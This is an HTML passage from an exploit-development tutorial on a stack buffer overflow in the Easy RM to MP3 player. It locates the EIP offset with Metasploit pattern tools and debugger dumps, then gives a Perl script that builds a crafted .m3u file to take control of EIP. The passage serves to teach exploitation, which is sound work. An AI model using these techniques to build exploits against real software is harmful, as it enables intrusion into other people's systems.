<!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">
<html xmlns="http://www.w3.org/1999/xhtml">
<head>
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />
<title>Determining Buffer Size To Write EIP</title>
</head><body>We know that EIP is located somewhere between 20000 and 30000 bytes from the beginning of the buffer. Now, you could potentially overwrite all memory space between 20000 and 30000 bytes with the address you want to overwrite EIP with. This may work, but it looks much more nice if you can find the exact location to perform the overwrite. In order to determine the exact offset of EIP in our buffer, we need to do some additional work.<br/>
<br/>
First, let’s try to narrow down the location by changing our perl script just a little :<br/>
<br/>
Let’s cut things in half. We’ll create a file that contains 25000 A’s and another 5000 B’s. If EIP contains an 41414141 (AAAA), EIP sits between 20000 and 25000, and if EIP contains 42424242 (BBBB), EIP sits between 25000 and 30000. Create the file and open crash25000.m3u in Easy RM to MP3.<br/>
<img src="image.png" /><br/>
<br/>
OK, so eip contains 42424242 (BBBB), so we know EIP has an offset between 25000 and 30000. That also means that we should/may see the remaining B’s in memory where ESP points at (given that EIP was overwritten before the end of the 30000 character buffer) <br/>
<br/>
dump the contents of ESP :<br/>
<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff740 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff750 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff760 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff770 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff780 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff790 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
000ff7a0 &nbsp;42 42 42 42 42 42 42 42-42 42 42 42 42 42 42 42 &nbsp;BBBBBBBBBBBBBBBB<br/>
<br/>
That is great news. We have overwritten EIP with BBBB and we can also see our buffer in ESP.<br/>
<br/>
Before we can start tweaking the script, we need to find the exact location in our buffer that overwrites EIP.<br/>
<br/>
In order to find the exact location, we’ll use Metasploit.<br/>
<br/>
Metasploit has a nice tool to assist us with calculating the offset. It will generate a string that contains unique patterns. Using this pattern (and the value of EIP after using the pattern in our malicious .m3u file), we can see how big the buffer should be to write exactly into EIP.<br/>
<br/>
Open the tools folder in the metasploit framework3 folder (I’m using a linux version of metasploit 3). You should find a tool called pattern_create.rb. Create a pattern of 5000 characters and write it into a file.<br/>
<br/>
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb<br/>
Usage: pattern_create.rb length [set a] [set b] [set c]<br/>
root@bt:/pentest/exploits/framework3/tools# ./pattern_create.rb 5000 <br/>
<br/>
Edit the perl script and replace the content of $junk2 with our 5000 characters.<br/>
<br/>
Create the m3u file. open this file in Easy RM to MP3, wait until the application dies again, and take note of the contents of EIP<br/>
<br/>
<img src="image 2.png" /><br/>
<br/>
At this time, eip contains 0x356b4234 (note : little endian : we have overwritten EIP with 34 42 6b 35 = 4Bk5<br/>
<br/>
Let’s use a second metasploit tool now, to calculate the exact length of the buffer before writing into EIP, feed it with the value of EIP (based on the pattern file) and length of the buffer :<br/>
<br/>
root@bt:/pentest/exploits/framework3/tools# ./pattern_offset.rb 0x356b4234 5000<br/>
1094<br/>
root@bt:/pentest/exploits/framework3/tools#<br/>
<br/>
1094. That’s the buffer length needed to overwrite EIP. So if you create a file with 25000+1094 A’s, and then add 4 B’s (42 42 42 42 in hex) EIP should contain 42 42 42 42.� We also know that ESP points at data from our buffer, so we’ll add some C’s after overwriting EIP.<br/>
<br/>
Let’s try. Modify the perl script to create the new m3u file.<br/>
<br/>
my $file= "eipcrash.m3u";<br/>
my $junk= "A" x 26094;<br/>
my $eip = "BBBB";<br/>
my $espdata = "C" x 1000;<br/>
open($FILE,"&gt;$file");<br/>
print $FILE $junk.$eip.$espdata;<br/>
close($FILE);<br/>
print "m3u File Created successfully\n";<br/>
<br/>
Create eipcrash.m3u, open it in Easy RM to MP3, observe the crash and look at eip and the contents of the memory at ESP<br/>
<br/>
<img src="image 3.png" /><br/>
<br/>
0:000&gt; d esp<br/>
000ff730 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff740 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff750 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff760 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff770 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff780 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff790 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
000ff7a0 &nbsp;43 43 43 43 43 43 43 43-43 43 43 43 43 43 43 43 &nbsp;CCCCCCCCCCCCCCCC<br/>
<br/>
In Immunity Debugger, you can see the contents of the stack, at ESP, by looking at the lower right hand window.<br/>
<br/>
Excellent. EIP contains BBBB, which is exactly what we wanted. So now we control EIP. On top of that, ESP points to our buffer (C’s)<br/>
<br/>
Note : the offset shown here is the result of the analysis on my own system. If you are trying to reproduce the exercises from this tutorial on your own system, odds are high that you will get a different offset address. So please don’t just take the offset value or copy the source code to your system, as the offset is based on the file path where the m3u file is stored. The buffer that is vulnerable to an overflow includes the full path to the m3u file. So if the path on your system is shorter or larger than mine, then the offset will be different.<br/>
<br/>
Our exploit buffer so far looks like this :<br/>
<br/>
<img src="image 4.png" /><br/>
<br/>
<br/>
<br/>
<br/>
</body></html>